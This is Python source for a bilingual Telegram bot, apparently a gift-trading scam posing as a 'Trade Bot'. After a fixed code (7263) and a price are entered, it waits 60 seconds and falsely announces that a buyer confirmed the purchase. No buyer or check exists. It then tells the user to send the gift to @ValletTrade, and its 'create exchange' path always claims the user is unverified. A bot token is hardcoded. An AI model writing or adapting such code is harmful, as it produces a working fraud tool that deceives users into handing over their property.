import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8669209199:AAFnRG3FG4q0KpR7T-bk_THhpAhEltz_H7U"

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== КНОПКИ ====================
def get_main_keyboard():
    """Главная клавиатура с кнопками"""
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔄 Создать обмен")],
            [KeyboardButton(text="📝 Начать обмен")],
            [KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True
    )
    return keyboard

# ==================== СОСТОЯНИЯ ====================
class TradeStates(StatesGroup):
    waiting_for_exchange = State()
    waiting_for_verify_code = State()  # Новое состояние для кода 7263
    waiting_for_price = State()
    waiting_for_confirmation = State()

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    """Обработчик команды /start"""
    await state.clear()
    await message.answer(
        "🤖 *Добро пожаловать в Trade Bot!*\n"
        "Используйте кнопки для навигации:\n\n"
        "🤖 *Welcome to Trade Bot!*\n"
        "Use the buttons to navigate:",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    """Обработчик команды /cancel"""
    current_state = await state.get_state()
    if current_state is None:
        await message.answer(
            "❌ Нет активных операций для отмены.\n"
            "❌ No active operations to cancel.",
            reply_markup=get_main_keyboard()
        )
        return
    
    await state.clear()
    await message.answer(
        "❌ Операция отменена.\n"
        "Для начала введите /start\n\n"
        "❌ Operation cancelled.\n"
        "To start, enter /start",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("create_exchange"))
async def cmd_create_exchange(message: types.Message, state: FSMContext):
    """Обработчик команды /create_exchange"""
    await state.clear()
    await message.answer(
        "❌ *Вы не прошли верификацию!*\n"
        "Для верификации напишите: @ValletTrade\n\n"
        "❌ *You are not verified!*\n"
        "For verification, contact: @ValletTrade",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ==================== ОБРАБОТКА КНОПОК ====================
@dp.message(lambda message: message.text == "🔄 Создать обмен")
async def button_create_exchange(message: types.Message, state: FSMContext):
    """Кнопка Создать обмен"""
    await state.clear()
    await message.answer(
        "❌ *Вы не прошли верификацию!*\n"
        "Для верификации напишите: @ValletTrade\n\n"
        "❌ *You are not verified!*\n"
        "For verification, contact: @ValletTrade",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

@dp.message(lambda message: message.text == "📝 Начать обмен")
async def button_start_exchange(message: types.Message, state: FSMContext):
    """Кнопка Начать обмен"""
    await state.set_state(TradeStates.waiting_for_exchange)
    await message.answer(
        "📝 Напишите номер обмена:\n\n"
        "📝 Enter the exchange number:",
        reply_markup=get_main_keyboard()
    )

@dp.message(lambda message: message.text == "❌ Отмена")
async def button_cancel(message: types.Message, state: FSMContext):
    """Кнопка Отмена"""
    current_state = await state.get_state()
    if current_state is None:
        await message.answer(
            "❌ Нет активных операций для отмены.",
            reply_markup=get_main_keyboard()
        )
        return
    
    await state.clear()
    await message.answer(
        "❌ Операция отменена.\n"
        "❌ Operation cancelled.",
        reply_markup=get_main_keyboard()
    )

# ==================== ОСНОВНАЯ ЛОГИКА ====================
@dp.message(TradeStates.waiting_for_exchange)
async def process_exchange_number(message: types.Message, state: FSMContext):
    """Обработка номера обмена"""
    # Проверяем, что введено число
    if not message.text.isdigit():
        await message.answer(
            "❌ Пожалуйста, введите номер обмена *цифрами*:\n"
            "❌ Please enter the exchange number *in digits*:",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Сохраняем номер обмена
    await state.update_data(exchange_number=message.text)
    
    # Просим ввести код подтверждения
    await state.set_state(TradeStates.waiting_for_verify_code)
    await message.answer(
        f"🔐 Введите *код подтверждения* для сделки #{message.text}:\n"
        f"🔐 Enter the *verification code* for exchange #{message.text}:",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

@dp.message(TradeStates.waiting_for_verify_code)
async def process_verify_code(message: types.Message, state: FSMContext):
    """Обработка кода подтверждения (7263)"""
    code = message.text.strip()
    
    # Проверяем код
    if code != "7263":
        await message.answer(
            f"❌ *Неверный код!*\n"
            f"Вы ввели: {code}\n"
            f"Пожалуйста, введите правильный код для сделки.\n\n"
            f"❌ *Wrong code!*\n"
            f"You entered: {code}\n"
            f"Please enter the correct code for the exchange.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Код верный - продолжаем
    await state.set_state(TradeStates.waiting_for_price)
    
    # Получаем номер обмена
    data = await state.get_data()
    exchange_number = data.get('exchange_number')
    
    await message.answer(
        f"✅ *Код подтвержден!*\n"
        f"✅ *Вы успешно подключились к обмену #{exchange_number}*\n\n"
        f"💰 Сколько хотите за подарок? (в долларах)\n"
        f"💰 How much do you want for the gift? (in dollars)",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

@dp.message(TradeStates.waiting_for_price)
async def process_price(message: types.Message, state: FSMContext):
    """Обработка суммы"""
    # Проверяем, что введено число
    try:
        price = float(message.text.replace(',', '.'))
        if price <= 0:
            await message.answer(
                "❌ Сумма должна быть *больше 0*:\n"
                "❌ Amount must be *greater than 0*:",
                parse_mode="Markdown"
            )
            return
    except ValueError:
        await message.answer(
            "❌ Пожалуйста, введите *число* (например: 100 или 150.50):\n"
            "❌ Please enter a *number* (e.g., 100 or 150.50):",
            parse_mode="Markdown"
        )
        return
    
    # Сохраняем сумму
    await state.update_data(price=price)
    
    # Форматируем сумму
    if price.is_integer():
        price_str = f"${int(price)}"
    else:
        price_str = f"${price:.2f}"
    
    # Отправляем сообщение о подтверждении
    await message.answer(
        f"⏳ *Ожидание подтверждения покупки...*\n"
        f"💰 Сумма: {price_str}\n"
        f"⏳ *Waiting for purchase confirmation...*\n"
        f"💰 Amount: {price_str}",
        parse_mode="Markdown"
    )
    
    # Переходим в состояние ожидания подтверждения
    await state.set_state(TradeStates.waiting_for_confirmation)
    
    # ⏳ ЗАДЕРЖКА 60 СЕКУНД
    await asyncio.sleep(60)
    
    # Проверяем, не отменили ли операцию
    current_state = await state.get_state()
    if current_state != TradeStates.waiting_for_confirmation:
        return
    
    # Получаем данные
    data = await state.get_data()
    exchange_number = data.get('exchange_number')
    final_price = data.get('price')
    
    # Форматируем финальную сумму
    if final_price.is_integer():
        final_price_str = f"${int(final_price)}"
    else:
        final_price_str = f"${final_price:.2f}"
    
    # Отправляем финальное сообщение
    await message.answer(
        f"✅ *Покупатель подтвердил покупку!*\n"
        f"📦 Отправьте подарок: @ValletTrade\n\n"
        f"📋 *Детали обмена:*\n"
        f"└ Номер: #{exchange_number}\n"
        f"└ Сумма: {final_price_str}\n\n"
        f"✅ *Buyer confirmed the purchase!*\n"
        f"📦 Send the gift to: @ValletTrade\n\n"
        f"📋 *Exchange details:*\n"
        f"└ Number: #{exchange_number}\n"
        f"└ Amount: {final_price_str}",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    
    # Очищаем состояние
    await state.clear()

# ==================== ОБРАБОТКА ЛЮБЫХ СООБЩЕНИЙ ====================
@dp.message()
async def handle_all_messages(message: types.Message, state: FSMContext):
    """Обработка любых сообщений, если нет активного состояния"""
    current_state = await state.get_state()
    
    # Если нет активного состояния - предлагаем начать
    if current_state is None:
        # Проверяем, может это номер обмена?
        if message.text.isdigit() and len(message.text) >= 3:
            # Если пользователь ввел число - автоматически начинаем
            await state.set_state(TradeStates.waiting_for_exchange)
            await process_exchange_number(message, state)
        else:
            await message.answer(
                "❓ Я не понимаю эту команду.\n"
                "Используйте кнопки для навигации:\n\n"
                "❓ I don't understand this command.\n"
                "Use the buttons to navigate:",
                reply_markup=get_main_keyboard()
            )
        return
    
    # Если есть состояние, но сообщение не обработано - игнорируем
    await message.answer(
        "⏳ Пожалуйста, следуйте инструкциям бота.\n"
        "Используйте кнопки для ответа.\n\n"
        "⏳ Please follow the bot's instructions.\n"
        "Use the buttons to reply.",
        reply_markup=get_main_keyboard()
    )

# ==================== ЗАПУСК БОТА ====================
async def main():
    """Главная функция запуска бота"""
    print("=" * 50)
    print("🤖 TRADE BOT ЗАПУЩЕН!")
    print("🔐 Код подтверждения: 7263")
    print("⏳ Задержка после суммы: 60 секунд")
    print("💰 Валюта: Доллары ($)")
    print("🌐 Языки: Русский / English")
    print("=" * 50)
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
